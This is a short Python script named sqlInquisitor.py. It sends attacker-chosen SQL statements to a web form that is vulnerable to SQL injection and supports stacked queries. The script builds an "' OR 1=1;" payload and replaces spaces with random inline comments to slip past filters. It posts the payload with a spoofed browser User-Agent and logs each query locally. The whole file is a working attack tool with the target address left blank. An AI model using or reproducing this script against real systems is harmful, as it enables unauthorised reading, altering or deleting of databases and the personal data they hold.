#codeName: sqlInquisitor.py
#Author: Dahir Muhammad Dahir
#Date: 15th-November-2018
#About: script for issuing queries to target vulnerable
#       to sql Injection and supporting stacked queries

import os
import requests
import argparse
from string import digits, ascii_lowercase as lowercase
from random import sample

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) \
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"}

thisDir = os.getcwd() # var for current working dir

def main():
    characters = digits + lowercase # sample space for random string generation
    random_string = "".join(sample(characters, 6))
    parser = argparse.ArgumentParser(description="sqlinquisitor allow issuing queries to target vulnerable to sql injection and supporting stacked queries")
    parser.add_argument("-a", "--argument", help="the sql argument you want to execute", required=True)
    args = parser.parse_args()
    print(queryDB(args.argument, random_string))


def queryDB(query, random_string):
    complete_query = ("' OR 1=1; %s -- a"%(query)).replace(' a', "ayilar").replace(' ', "/*"+random_string+"*/").replace('ayilar', ' a')
    data = {"regno":complete_query, "submit":"Submit"}
    targetAdrress = ""
    with requests.Session() as s:
        sent_query = s.post(targetAdrress, data=data, headers=headers)
        if sent_query.status_code == 200:
            writeQuery(query)
            return "Query Executed Successfully"
        else:
            return "Error occured! please check your query..."


def writeQuery(query):
    with open(thisDir+"/queriesHistory.dmd", "a") as f:
        f.write(query+"\n")


if __name__=="__main__":
    main()